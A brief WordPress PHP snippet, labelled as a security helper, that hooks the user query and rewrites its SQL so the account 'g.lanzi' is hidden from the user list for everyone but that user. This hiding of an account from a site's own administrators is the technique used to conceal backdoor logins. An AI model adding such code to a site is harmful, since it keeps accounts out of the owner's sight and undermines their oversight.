<?php
/********************************/
/* Useful functions for security */
/********************************/

// Nascondi utente dalla lista
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;

	if ($username == 'g.lanzi') {
	}

	else {
	global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'g.lanzi'",$user_search->query_where);
  }
}
